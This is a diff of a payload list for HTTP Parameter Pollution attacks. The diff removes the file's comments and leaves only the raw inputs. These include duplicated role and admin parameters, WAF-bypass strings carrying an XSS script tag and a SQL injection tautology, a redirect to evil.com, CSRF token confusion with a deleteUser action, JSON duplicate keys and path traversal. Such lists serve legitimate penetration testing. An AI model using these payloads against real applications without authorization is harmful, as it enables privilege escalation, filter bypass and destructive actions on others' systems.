@@ -1,47 +1,28 @@
-# ============================================================
-# HTTP Parameter Pollution — Basic Payloads
-# ============================================================
-
-# ---- Duplicate Parameters (same name) ----
-# Different servers use first, last, or all values
 ?id=1&id=2
 ?role=user&role=admin
 ?param=legitimate&param=malicious
 
-# ---- HPP for WAF Bypass ----
-# WAF checks first occurrence, backend uses second (or vice versa)
 ?q=normal&q=<script>alert(1)</script>
 ?search=safe&search=' OR '1'='1
 ?url=https://safe.com&url=https://evil.com
 
-# ---- HPP for Logic Bypass ----
-# CSRF token check on first param, action on second
 ?token=VALID&token=INVALID&action=deleteUser
-# Or: inject second occurrence of security param
 ?admin=false&admin=true
 ?verified=false&verified=true
 
-# ---- Query String + Body Pollution ----
-# Backend merges both?
-# Query: ?id=1
-# Body: id=admin
 GET /api/user?id=1 HTTP/1.1
 Body: id=admin
 
-# ---- JSON HPP ----
 {"id": 1, "id": 2}
 {"role": "user", "role": "admin"}
 [{"id":1},{"id":2}]
 
-# ---- Array Notation ----
 ?id[]=1&id[]=2
 ?id[0]=1&id[1]=2
 ?param[]=legit&param[]=malicious
 
-# ---- Rails / PHP Array ----
 ?ids[]=1&ids[]=2&ids[]=3
 ?user[role]=admin&user[name]=test
 
-# ---- Path Parameter Pollution ----
 /api/user/1/role/admin
 /api/user/1/../admin/2
